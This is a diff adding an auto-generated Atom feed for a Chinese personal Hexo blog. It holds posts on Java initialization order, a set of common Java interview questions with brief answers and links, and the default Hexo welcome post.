@@ -1,0 +1,1042 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>CRAYMC</title>
+  <subtitle>http://www.craymc.com</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://www.craymc.com/"/>
+  <updated>2017-01-12T14:32:35.542Z</updated>
+  <id>http://www.craymc.com/</id>
+  
+  <author>
+    <name>craymc</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>java中方法执行顺序</title>
+    <link href="http://www.craymc.com/2017/01/12/java%E4%B8%AD%E6%96%B9%E6%B3%95%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F/"/>
+    <id>http://www.craymc.com/2017/01/12/java中方法执行顺序/</id>
+    <published>2017-01-12T14:31:04.000Z</published>
+    <updated>2017-01-12T14:32:35.542Z</updated>
+    
+    <content type="html"><![CDATA[<p>静态代码块：用staitc声明，jvm加载类时执行，仅执行一次</p>
+<p>它是随着类的加载而执行，只执行一次，并优先于主函数。具体说，静态代码块是由类调用的。类调用时，先执行静态代码块，然后才执行主函数的。<br>静态代码块其实就是给类初始化的，而构造代码块是给对象初始化的。<br>静态代码块中的变量是局部变量，与普通函数中的局部变量性质没有区别。<br>一个类中可以有多个静态代码块<br><a id="more"></a><br>构造代码块：<br>构造代码块的作用是给对象进行初始化。<br>对象一建立就运行构造代码块了，而且优先于构造函数执行。这里要强调一下，有对象建立，才会运行构造代码块，类不能调用构造代码块的。<br>构造代码块与构造函数的区别是：构造代码块是给所有对象进行统一初始化，而构造函数是给对应的对象初始化，因为构造函数是可以多个的，运行哪个构造函数就会建立什么样的对象，但无论建立哪个对象，都会先执行相同的构造代码块。也就是说，构造代码块中定义的是不同对象共性的初始化内容。<br>构造函数：</p>
+<p>1.对象一建立，就会调用与之相应的构造函数，也就是说，不建立对象，构造函数时不会运行的。<br>2.构造函数的作用是用于给对象进行初始化。<br>3.一个对象建立，构造函数只运行一次，而一般方法可以被该对象调用多次。</p>
+<p>明白以上概念后，总计如下：对于一个类 执行顺序为：1.静态代码2.main（）方法3.构造代码（如果对象建立就会执行）4.构造函数</p>
+<p>出现继承时：<br>执行父类的静态代码块，并初始化父类静态成员变量<br>执行子类的静态代码块，并初始化子类静态成员变量<br>执行父类的构造代码块，执行父类的构造函数，并初始化父类普通成员变量<br>执行子类的构造代码块， 执行子类的构造函数，并初始化子类普通成员变量</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;静态代码块：用staitc声明，jvm加载类时执行，仅执行一次&lt;/p&gt;
+&lt;p&gt;它是随着类的加载而执行，只执行一次，并优先于主函数。具体说，静态代码块是由类调用的。类调用时，先执行静态代码块，然后才执行主函数的。&lt;br&gt;静态代码块其实就是给类初始化的，而构造代码块是给对象初始化的。&lt;br&gt;静态代码块中的变量是局部变量，与普通函数中的局部变量性质没有区别。&lt;br&gt;一个类中可以有多个静态代码块&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Java" scheme="http://www.craymc.com/tags/Java/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>java常见面试题</title>
+    <link href="http://www.craymc.com/2017/01/12/java%E5%B8%B8%E8%A7%81%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
+    <id>http://www.craymc.com/2017/01/12/java常见面试题/</id>
+    <published>2017-01-12T13:36:50.000Z</published>
+    <updated>2017-01-12T14:33:24.276Z</updated>
+    
+    <content type="html"><![CDATA[<ul>
+<li><a href="#java">java基础</a><ul>
+<li><a href="#接口的意义-百度">接口的意义-百度</a></li>
+<li><a href="#抽象类的意义-乐视">抽象类的意义-乐视</a></li>
+<li><a href="#内部类的作用-乐视">内部类的作用-乐视</a></li>
+<li><a href="#父类的静态方法能否被子类重写-猎豹">父类的静态方法能否被子类重写-猎豹</a></li>
+<li><a href="#java排序算法-美团">java排序算法-美团</a></li>
+<li><a href="#列举java的集合和继承关系-百度-美团">列举java的集合和继承关系-百度-美团</a></li>
+<li><a href="#java虚拟机的特性-百度-乐视">java虚拟机的特性-百度-乐视</a></li>
+<li><a href="#哪些情况下的对象会被垃圾回收机制处理掉-美团-小米">哪些情况下的对象会被垃圾回收机制处理掉-美团-小米</a></li>
+<li><a href="#进程和线程的区别-猎豹-美团">进程和线程的区别-猎豹-美团</a></li>
+<li><a href="#java中==和equals和hashCode的区别-乐视">==和equals和hashCode的区别-乐视</a></li>
+<li><a href="#常见的排序算法时间复杂度-小米">常见的排序算法时间复杂度-小米</a></li>
+<li><a href="#HashMap的实现原理-美团">HashMap的实现原理-美团</a></li>
+<li><a href="#java状态机">java状态机</a></li>
+<li><a href="#int-char-long各占多少字节数">int-char-long各占多少字节数</a></li>
+<li><a href="#int与integer的区别">int与integer的区别</a></li>
+<li><a href="#string-stringbuffer-stringbuilder区别-小米-乐视-百度">string-stringbuffer-stringbuilder区别-小米-乐视-百度</a></li>
+<li><a href="#java多态-乐视">java多态-乐视</a></li>
+<li><a href="#什么导致线程阻塞-58-美团">什么导致线程阻塞-58-美团</a></li>
+<li><a href="#抽象类接口区别-360">抽象类接口区别-360</a></li>
+<li><a href="#容器类之间的区别-乐视-美团">容器类之间的区别-乐视-美团</a></li>
+<li><a href="#内部类">内部类</a></li>
+<li><a href="#hashmap和hashtable的区别-乐视-小米">hashmap和hashtable的区别-乐视-小米</a></li>
+<li><a href="#arraymap对比hashmap">ArrayMap对比HashMap</a><br>###java</li>
+</ul>
+</li>
+</ul>
+<p>####接口的意义-百度</p>
+<p>规范、扩展、回调<br><a id="more"></a></p>
+<p>####抽象类的意义-乐视</p>
+<p>为其子类提供一个公共的类型<br>封装子类中得重复内容<br>定义抽象方法，子类虽然有不同的实现 但是定义是一致的</p>
+<p>####内部类的作用-乐视</p>
+<ol>
+<li>内部类可以用多个实例，每个实例都有自己的状态信息，并且与其他外围对象的信息相互独立。</li>
+<li>在单个外围类中，可以让多个内部类以不同的方式实现同一个接口，或者继承同一个类。</li>
+<li>创建内部类对象的时刻并不依赖于外围类对象的创建。</li>
+<li>内部类并没有令人迷惑的“is-a”关系，他就是一个独立的实体。</li>
+<li>内部类提供了更好的封装，除了该外围类，其他类都不能访问</li>
+</ol>
+<p>抽象类就是为了继承而存在的，如果你定义了一个抽象类，却不去继承它，那么等于白白创建了这个抽象类，因为你不能用它来做任何事情。对于一个父类，如果它的某个方法在父类中实现出来没有任何意义，必须根据子类的实际需求来进行不同的实现，那么就可以将这个方法声明为abstract方法，此时这个类也就成为abstract类了。<br>  抽象类和普通类的主要有三点区别：</p>
+<p>1）抽象方法必须为public或者protected（因为如果为private，则不能被子类继承，子类便无法实现该方法），缺省情况下默认为public。</p>
+<p>2）抽象类不能用来创建对象；</p>
+<p>3）如果一个类继承于一个抽象类，则子类必须实现父类的抽象方法。如果子类没有实现父类的抽象方法，则必须将子类也定义为为abstract类。</p>
+<p>什么时候使用抽象类和接口</p>
+<p>如果你拥有一些方法并且想让它们中的一些有默认实现，那么使用抽象类吧。<br>如果你想实现多重继承，那么你必须使用接口。由于Java不支持多继承，子类不能够继承多个类，但可以实现多个接口。因此你就可以使用接口来解决它。<br>如果基本功能在不断改变，那么就需要使用抽象类。如果不断改变基本功能并且使用接口，那么就需要改变所有实现了该接口的类。</p>
+<p>####父类的静态方法能否被子类重写-猎豹</p>
+<p>不能</p>
+<p>子类继承父类后，用相同的静态方法和非静态方法，这时非静态方法覆盖父类中的方法（即方法重写），父类的该静态方法被隐藏（如果对象是父类则调用该隐藏的方法），另外子类可继承父类的静态与非静态方法，至于方法重载我觉得它其中一要素就是在同一类中，不能说父类中的什么方法与子类里的什么方法是方法重载的体现</p>
+<p>快速失败和安全失败<br>快速失败：对于非并发集合来说，在其进行迭代时，例如iterator迭代时，iterator是另起一个线程，若有其他线程（如 Collection）进行结构修改（修改了增减了集合中的内容），这个迭代会马上感知到，并且立即抛出 ConcurrentModificationException 异常，而不是迭代完成后才告诉你出错了，引起快速失败。若用iterator进行修改则不会出现这个问题，如iterator.move();也就是说涉 及到了多个线程间的同步问题</p>
+<p>####java排序算法-美团</p>
+<p><a href="http://blog.csdn.net/qy1387/article/details/7752973" target="_blank" rel="external">http://blog.csdn.net/qy1387/article/details/7752973</a></p>
+<p>####列举java的集合和继承关系-百度-美团</p>
+<p><img src="https://github.com/JackyAndroid/AndroidInterview-Q-A/blob/master/picture/collection.png" alt=""></p>
+<p>####java虚拟机的特性-百度-乐视</p>
+<p>Java语言的一个非常重要的特点就是与平台的无关性。而使用Java虚拟机是实现这一特点的关键。一般的高级语言如果要在不同的平台上运行，至少需要编译成不同的目标代码。而引入Java语言虚拟机后，Java语言在不同平台上运行时不需要重新编译。Java语言使用模式Java虚拟机屏蔽了与具体平台相关的信息，使得Java语言编译程序只需生成在Java虚拟机上运行的目标代码（字节码），就可以在多种平台上不加修改地运行。Java虚拟机在执行字节码时，把字节码解释成具体平台上的机器指令执行。</p>
+<p>####哪些情况下的对象会被垃圾回收机制处理掉-美团-小米</p>
+<p>Java 垃圾回收机制最基本的做法是分代回收。内存中的区域被划分成不同的世代，对象根据其存活的时间被保存在对应世代的区域中。一般的实现是划分成3个世代：年轻、年老和永久。内存的分配是发生在年轻世代中的。当一个对象存活时间足够长的时候，它就会被复制到年老世代中。对于不同的世代可以使用不同的垃圾回收算法。进行世代划分的出发点是对应用中对象存活时间进行研究之后得出的统计规律。一般来说，一个应用中的大部分对象的存活时间都很短。比如局部变量的存活时间就只在方法的执行过程中。基于这一点，对于年轻世代的垃圾回收算法就可以很有针对性。</p>
+<p>####进程和线程的区别-猎豹-美团</p>
+<p>简而言之,一个程序至少有一个进程,一个进程至少有一个线程。</p>
+<p>线程的划分尺度小于进程，使得多线程程序的并发性高。</p>
+<p>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</p>
+<p>线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。</p>
+<p>从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别。</p>
+<p>进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动,进程是系统进行资源分配和调度的一个独立单位.</p>
+<p>线程是进程的一个实体,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位.线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄存器和栈),但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源.</p>
+<p>一个线程可以创建和撤销另一个线程;同一个进程中的多个线程之间可以并发执行.</p>
+<p>进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。如果有兴趣深入的话，我建议你们看看《现代操作系统》或者《操作系统的设计与实现》。对就个问题说得比较清楚。</p>
+<p>####java中==和equals和hashCode的区别-乐视</p>
+<p><a href="http://blog.csdn.net/tiantiandjava/article/details/46988461" target="_blank" rel="external">http://blog.csdn.net/tiantiandjava/article/details/46988461</a></p>
+<p>####常见的排序算法时间复杂度-小米</p>
+<p>####HashMap的实现原理-美团</p>
+<ol>
+<li>HashMap概述：<br>HashMap是基于哈希表的Map接口的非同步实现。此实现提供所有可选的映射操作，并允许使用null值和null键。此类不保证映射的顺序，特别是它不保证该顺序恒久不变。 </li>
+<li>HashMap的数据结构：<br> 在java编程语言中，最基本的结构就是两种，一个是数组，另外一个是模拟指针（引用），所有的数据结构都可以用这两个基本结构来构造的，HashMap也不例外。HashMap实际上是一个“链表散列”的数据结构，即数组和链表的结合体。</li>
+</ol>
+<p>从上图中可以看出，HashMap底层就是一个数组结构，数组中的每一项又是一个链表。当新建一个HashMap的时候，就会初始化一个数组。</p>
+<p>####状态机</p>
+<p><a href="http://www.jdon.com/designpatterns/designpattern_State.htm" target="_blank" rel="external">http://www.jdon.com/designpatterns/designpattern_State.htm</a></p>
+<p>####int-char-long各占多少字节数</p>
+<p>byte 位数 8 字节数 1</p>
+<p>short 16 2</p>
+<p>int 32 4</p>
+<p>long 64 8</p>
+<p>float 32 4</p>
+<p>double 64 8</p>
+<p>char 16 2</p>
+<p>####int与integer的区别</p>
+<p><a href="http://www.cnblogs.com/shenliang123/archive/2011/10/27/2226903.html" target="_blank" rel="external">http://www.cnblogs.com/shenliang123/archive/2011/10/27/2226903.html</a></p>
+<p>####string-stringbuffer-stringbuilder区别-小米-乐视-百度</p>
+<p>String 字符串常量</p>
+<p>StringBuffer 字符串变量（线程安全）</p>
+<p>StringBuilder 字符串变量（非线程安全）</p>
+<p>简要的说， String 类型和 StringBuffer 类型的主要性能区别其实在于 String 是不可变的对象, 因此在每次对 String 类型进行改变的时候其实都等同于生成了一个新的 String 对象，然后将指针指向新的 String 对象，所以经常改变内容的字符串最好不要用String ，因为每次生成对象都会对系统性能产生影响，特别当内存中无引用对象多了以后,JVM 的 GC 就会开始工作，那速度是一定会相当慢的。</p>
+<p>而如果是使用 StringBuffer 类则结果就不一样了，每次结果都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，再改变对象引用。所以在一般情况下我们推荐使用 StringBuffer ，特别是字符串对象经常改变的情况下。而在某些特别情况下， String 对象的字符串拼接其实是被 JVM 解释成了 StringBuffer 对象的拼接，所以这些时候 String 对象的速度并不会比 StringBuffer 对象慢，而特别是以下的字符串对象生成中， String 效率是远要比 StringBuffer 快的：</p>
+<p>String S1 = “This is only a” + “ simple” + “ test”;</p>
+<p>StringBuffer Sb = new StringBuilder(“This is only a”).append(“ simple”).append(“ test”);<br>你会很惊讶的发现，生成 String S1 对象的速度简直太快了，而这个时候 StringBuffer 居然速度上根本一点都不占优势。其实这是 JVM 的一个把戏，在 JVM 眼里，这个<br> String S1 = “This is only a” + “ simple” + “test”; 其实就是：<br> String S1 = “This is only a simple test”; 所以当然不需要太多的时间了。但大家这里要注意的是，如果你的字符串是来自另外的 String 对象的话，速度就没那么快了，譬如：<br> String S2 = “This is only a”;<br>String S3 = “ simple”;<br>String S4 = “ test”;<br>String S1 = S2 +S3 + S4;<br>这时候 JVM 会规规矩矩的按照原来的方式去做</p>
+<p>在大部分情况下 StringBuffer &gt; String</p>
+<p>StringBuffer</p>
+<p>Java.lang.StringBuffer线程安全的可变字符序列。一个类似于 String 的字符串缓冲区，但不能修改。虽然在任意时间点上它都包含某种特定的字符序列，但通过某些方法调用可以改变该序列的长度和内容。</p>
+<p>可将字符串缓冲区安全地用于多个线程。可以在必要时对这些方法进行同步，因此任意特定实例上的所有操作就好像是以串行顺序发生的，该顺序与所涉及的每个线程进行的方法调用顺序一致。</p>
+<p>StringBuffer 上的主要操作是 append 和 insert 方法，可重载这些方法，以接受任意类型的数据。每个方法都能有效地将给定的数据转换成字符串，然后将该字符串的字符追加或插入到字符串缓冲区中。append 方法始终将这些字符添加到缓冲区的末端；而 insert 方法则在指定的点添加字符。</p>
+<p>例如，如果 z 引用一个当前内容是“start”的字符串缓冲区对象，则此方法调用 z.append(“le”) 会使字符串缓冲区包含“startle”，而 z.insert(4, “le”) 将更改字符串缓冲区，使之包含“starlet”。</p>
+<p>在大部分情况下 StringBuilder &gt; StringBuffer</p>
+<p>java.lang.StringBuilder</p>
+<p>java.lang.StringBuilder一个可变的字符序列是5.0新增的。此类提供一个与 StringBuffer 兼容的 API，但不保证同步。该类被设计用作 StringBuffer 的一个简易替换，用在字符串缓冲区被单个线程使用的时候（这种情况很普遍）。如果可能，建议优先采用该类，因为在大多数实现中，它比 StringBuffer 要快。两者的方法基本相同</p>
+<p>####java多态-乐视</p>
+<p>Java多态性理解</p>
+<p>Java中多态性的实现</p>
+<p>什么是多态</p>
+<p>面向对象的三大特性：封装、继承、多态。从一定角度来看，封装和继承几乎都是为多态而准备的。这是我们最后一个概念，也是最重要的知识点。</p>
+<p>多态的定义：指允许不同类的对象对同一消息做出响应。即同一消息可以根据发送对象的不同而采用多种不同的行为方式。（发送消息就是函数调用）</p>
+<p>实现多态的技术称为：动态绑定（dynamic binding），是指在执行期间判断所引用对象的实<br>际类型，根据其实际的类型调用其相应的方法。</p>
+<p>多态的作用：消除类型之间的耦合关系。</p>
+<p>现实中，关于多态的例子不胜枚举。比方说按下 F1 键这个动作，如果当前在 Flash 界面下弹出的就是 AS 3 的帮助文档；如果当前在 Word 下弹出的就是 Word 帮助；在 Windows 下弹出的就是 Windows 帮助和支持。同一个事件发生在不同的对象上会产生不同的结果。<br>下面是多态存在的三个必要条件，要求大家做梦时都能背出来！</p>
+<p>多态存在的三个必要条件<br>一、要有继承；<br>二、要有重写；<br>三、父类引用指向子类对象。</p>
+<p> 多态的好处：</p>
+<p>1.可替换性（substitutability）。多态对已存在代码具有可替换性。例如，多态对圆Circle类工作，对其他任何圆形几何体，如圆环，也同样工作。</p>
+<p>2.可扩充性（extensibility）。多态对代码具有可扩充性。增加新的子类不影响已存在类的多态性、继承性，以及其他特性的运行和操作。实际上新加子类更容易获得多态功能。例如，在实现了圆锥、半圆锥以及半球体的多态基础上，很容易增添球体类的多态性。</p>
+<p>3.接口性（interface-ability）。多态是超类通过方法签名，向子类提供了一个共同接口，由子类来完善或者覆盖它而实现的。如图8.3 所示。图中超类Shape规定了两个实现多态的接口方法，computeArea()以及computeVolume()。子类，如Circle和Sphere为了实现多态，完善或者覆盖这两个接口方法。</p>
+<p>4.灵活性（flexibility）。它在应用中体现了灵活多样的操作，提高了使用效率。</p>
+<p>5.简化性（simplicity）。多态简化对应用软件的代码编写和修改过程，尤其在处理大量对象的运算和操作时，这个特点尤为突出和重要。</p>
+<p>Java中多态的实现方式：接口实现，继承父类进行方法重写，同一个类中进行方法重载。</p>
+<p>####什么导致线程阻塞-58-美团</p>
+<p>线程的阻塞</p>
+<p>为了解决对共享存储区的访问冲突，Java 引入了同步机制，现在让我们来考察多个线程对共享资源的访问，显然同步机制已经不够了，因为在任意时刻所要求的资源不一定已经准备好了被访问，反过来，同一时刻准备好了的资源也可能不止一个。为了解决这种情况下的访问控制问题，Java 引入了对阻塞机制的支持.</p>
+<p>阻塞指的是暂停一个线程的执行以等待某个条件发生（如某资源就绪），学过操作系统的同学对它一定已经很熟悉了。Java 提供了大量方法来支持阻塞，下面让我们逐一分析。</p>
+<ol>
+<li>sleep() 方法：sleep() 允许 指定以毫秒为单位的一段时间作为参数，它使得线程在指定的时间内进入阻塞状态，不能得到CPU 时间，指定的时间一过，线程重新进入可执行状态。<br>典型地，sleep() 被用在等待某个资源就绪的情形：测试发现条件不满足后，让线程阻塞一段时间后重新测试，直到条件满足为止。</li>
+<li>suspend() 和 resume() 方法：两个方法配套使用，suspend()使得线程进入阻塞状态，并且不会自动恢复，必须其对应的resume() 被调用，才能使得线程重新进入可执行状态。典型地，suspend() 和 resume() 被用在等待另一个线程产生的结果的情形：测试发现结果还没有产生后，让线程阻塞，另一个线程产生了结果后，调用 resume() 使其恢复。</li>
+<li>yield() 方法：yield() 使得线程放弃当前分得的 CPU 时间，但是不使线程阻塞，即线程仍处于可执行状态，随时可能再次分得 CPU 时间。调用 yield() 的效果等价于调度程序认为该线程已执行了足够的时间从而转到另一个线程.</li>
+<li>wait() 和 notify() 方法：两个方法配套使用，wait() 使得线程进入阻塞状态，它有两种形式，一种允许 指定以毫秒为单位的一段时间作为参数，另一种没有参数，前者当对应的 notify() 被调用或者超出指定时间时线程重新进入可执行状态，后者则必须对应的 notify() 被调用.</li>
+</ol>
+<p>初看起来它们与 suspend() 和 resume() 方法对没有什么分别，但是事实上它们是截然不同的。区别的核心在于，前面叙述的所有方法，阻塞时都不会释放占用的锁（如果占用了的话），而这一对方法则相反。</p>
+<p>上述的核心区别导致了一系列的细节上的区别。</p>
+<p>首先，前面叙述的所有方法都隶属于 Thread 类，但是这一对却直接隶属于 Object 类，也就是说，所有对象都拥有这一对方法。初看起来这十分不可思议，但是实际上却是很自然的，因为这一对方法阻塞时要释放占用的锁，而锁是任何对象都具有的，调用任意对象的 wait() 方法导致线程阻塞，并且该对象上的锁被释放。而调用 任意对象的notify()方法则导致因调用该对象的 wait() 方法而阻塞的线程中随机选择的一个解除阻塞（但要等到获得锁后才真正可执行）。</p>
+<p>其次，前面叙述的所有方法都可在任何位置调用，但是这一对方法却必须在 synchronized 方法或块中调用，理由也很简单，只有在synchronized 方法或块中当前线程才占有锁，才有锁可以释放。同样的道理，调用这一对方法的对象上的锁必须为当前线程所拥有，这样才有锁可以释放。因此，这一对方法调用必须放置在这样的 synchronized 方法或块中，该方法或块的上锁对象就是调用这一对方法的对象。若不满足这一条件，则程序虽然仍能编译，但在运行时会出现IllegalMonitorStateException 异常。</p>
+<p>wait() 和 notify() 方法的上述特性决定了它们经常和synchronized 方法或块一起使用，将它们和操作系统的进程间通信机制作一个比较就会发现它们的相似性：synchronized方法或块提供了类似于操作系统原语的功能，它们的执行不会受到多线程机制的干扰，而这一对方法则相当于 block 和wakeup 原语（这一对方法均声明为 synchronized）。它们的结合使得我们可以实现操作系统上一系列精妙的进程间通信的算法（如信号量算法），并用于解决各种复杂的线程间通信问题。</p>
+<p>关于 wait() 和 notify() 方法最后再说明两点：</p>
+<p>第一：调用 notify() 方法导致解除阻塞的线程是从因调用该对象的 wait() 方法而阻塞的线程中随机选取的，我们无法预料哪一个线程将会被选择，所以编程时要特别小心，避免因这种不确定性而产生问题。</p>
+<p>第二：除了 notify()，还有一个方法 notifyAll() 也可起到类似作用，唯一的区别在于，调用 notifyAll() 方法将把因调用该对象的 wait() 方法而阻塞的所有线程一次性全部解除阻塞。当然，只有获得锁的那一个线程才能进入可执行状态。</p>
+<p>谈到阻塞，就不能不谈一谈死锁，略一分析就能发现，suspend() 方法和不指定超时期限的 wait() 方法的调用都可能产生死锁。遗憾的是，Java 并不在语言级别上支持死锁的避免，我们在编程中必须小心地避免死锁。</p>
+<p>以上我们对 Java 中实现线程阻塞的各种方法作了一番分析，我们重点分析了 wait() 和 notify() 方法，因为它们的功能最强大，使用也最灵活，但是这也导致了它们的效率较低，较容易出错。实际使用中我们应该灵活使用各种方法，以便更好地达到我们的目的。</p>
+<p>####抽象类接口区别-360</p>
+<ol>
+<li><p>默认的方法实现<br>抽象类可以有默认的方法实现完全是抽象的。接口根本不存在方法的实现</p>
+</li>
+<li><p>实现<br>子类使用extends关键字来继承抽象类。如果子类不是抽象类的话，它需要提供抽象类中所有声明的方法的实现。<br>子类使用关键字implements来实现接口。它需要提供接口中所有声明的方法的实现</p>
+</li>
+<li><p>构造器<br>抽象类可以有构造器<br>接口不能有构造器</p>
+</li>
+<li><p>与正常Java类的区别<br>除了你不能实例化抽象类之外，它和普通Java类没有任何区<br>接口是完全不同的类型</p>
+</li>
+<li><p>访问修饰符<br>抽象方法可以有public、protected和default这些修饰符<br>接口方法默认修饰符是public。你不可以使用其它修饰符。</p>
+</li>
+<li><p>main方法<br>抽象方法可以有main方法并且我们可以运行它<br>接口没有main方法，因此我们不能运行它。</p>
+</li>
+<li><p>多继承<br>抽象类在java语言中所表示的是一种继承关系，一个子类只能存在一个父类，但是可以存在多个接口。</p>
+</li>
+<li><p>速度<br>它比接口速度要快<br>接口是稍微有点慢的，因为它需要时间去寻找在类中实现的方法。</p>
+</li>
+<li><p>添加新方法<br>如果你往抽象类中添加新的方法，你可以给它提供默认的实现。因此你不需要改变你现在的代码。<br>如果你往接口中添加方法，那么你必须改变实现该接口的类。</p>
+</li>
+</ol>
+<p>####容器类之间的区别-乐视-美团</p>
+<p><a href="http://www.cnblogs.com/yuanermen/archive/2009/08/05/1539917.html" target="_blank" rel="external">http://www.cnblogs.com/yuanermen/archive/2009/08/05/1539917.html</a><br><a href="http://alexyyek.github.io/2015/04/06/Collection/" target="_blank" rel="external">http://alexyyek.github.io/2015/04/06/Collection/</a><br><a href="http://tianmaying.com/tutorial/java_collection" target="_blank" rel="external">http://tianmaying.com/tutorial/java_collection</a></p>
+<p>####内部类</p>
+<p><a href="http://www.cnblogs.com/chenssy/p/3388487.html" target="_blank" rel="external">http://www.cnblogs.com/chenssy/p/3388487.html</a></p>
+<p>####hashmap和hashtable的区别-乐视-小米</p>
+<p><a href="http://www.233.com/ncre2/JAVA/jichu/20100717/084230917.html" target="_blank" rel="external">http://www.233.com/ncre2/JAVA/jichu/20100717/084230917.html</a></p>
+<p>####ArrayMap对比HashMap</p>
+<p><a href="http://lvable.com/?p=217" target="_blank" rel="external">http://lvable.com/?p=217</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#java&quot;&gt;java基础&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#接口的意义-百度&quot;&gt;接口的意义-百度&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#抽象类的意义-乐视&quot;&gt;抽象类的意义-乐视&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#内部类的作用-乐视&quot;&gt;内部类的作用-乐视&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#父类的静态方法能否被子类重写-猎豹&quot;&gt;父类的静态方法能否被子类重写-猎豹&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#java排序算法-美团&quot;&gt;java排序算法-美团&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#列举java的集合和继承关系-百度-美团&quot;&gt;列举java的集合和继承关系-百度-美团&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#java虚拟机的特性-百度-乐视&quot;&gt;java虚拟机的特性-百度-乐视&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#哪些情况下的对象会被垃圾回收机制处理掉-美团-小米&quot;&gt;哪些情况下的对象会被垃圾回收机制处理掉-美团-小米&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#进程和线程的区别-猎豹-美团&quot;&gt;进程和线程的区别-猎豹-美团&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#java中==和equals和hashCode的区别-乐视&quot;&gt;==和equals和hashCode的区别-乐视&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#常见的排序算法时间复杂度-小米&quot;&gt;常见的排序算法时间复杂度-小米&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#HashMap的实现原理-美团&quot;&gt;HashMap的实现原理-美团&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#java状态机&quot;&gt;java状态机&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#int-char-long各占多少字节数&quot;&gt;int-char-long各占多少字节数&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#int与integer的区别&quot;&gt;int与integer的区别&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#string-stringbuffer-stringbuilder区别-小米-乐视-百度&quot;&gt;string-stringbuffer-stringbuilder区别-小米-乐视-百度&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#java多态-乐视&quot;&gt;java多态-乐视&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#什么导致线程阻塞-58-美团&quot;&gt;什么导致线程阻塞-58-美团&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#抽象类接口区别-360&quot;&gt;抽象类接口区别-360&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#容器类之间的区别-乐视-美团&quot;&gt;容器类之间的区别-乐视-美团&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#内部类&quot;&gt;内部类&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#hashmap和hashtable的区别-乐视-小米&quot;&gt;hashmap和hashtable的区别-乐视-小米&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#arraymap对比hashmap&quot;&gt;ArrayMap对比HashMap&lt;/a&gt;&lt;br&gt;###java&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;####接口的意义-百度&lt;/p&gt;
+&lt;p&gt;规范、扩展、回调&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Java" scheme="http://www.craymc.com/tags/Java/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Hello World</title>
+    <link href="http://www.craymc.com/2016/07/20/hello-world/"/>
+    <id>http://www.craymc.com/2016/07/20/hello-world/</id>
+    <published>2016-07-20T10:47:00.000Z</published>
+    <updated>2017-01-12T12:48:30.024Z</updated>
+    
+    <content type="html"><![CDATA[<p>Welcome to <a href="http://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="http://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info.<br><a id="more"></a><br> If you get any problems when using Hexo, you can find the answer in <a href="http://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
